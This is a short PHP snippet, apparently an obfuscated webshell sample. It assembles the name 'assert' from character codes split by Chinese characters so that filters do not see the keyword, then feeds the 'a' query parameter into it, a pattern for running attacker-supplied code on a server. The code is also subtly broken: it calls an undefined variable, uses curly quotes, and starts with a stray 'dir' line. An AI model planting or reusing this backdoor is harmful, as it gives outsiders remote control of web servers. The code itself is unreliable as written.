dir
<?php
$a="我97我115我115我101我114我116";
$b=explode(‘我’,$a);
var_dump($b);
$c="";
$d=chr($b[1]);
$e=chr($b[2]);
$g=chr($b[4]);
$h=chr($b[5]);
$i=chr($b[6]);
$f=$c.$d.$e.$e.$g.$h.$i;
class A{
    var $a;
    function demo($a,$b){
        $this->$a=$s($b);
        echo $this;
    }
}
$obj=new A();
$obj->demo($f,$_GET['a']);
?>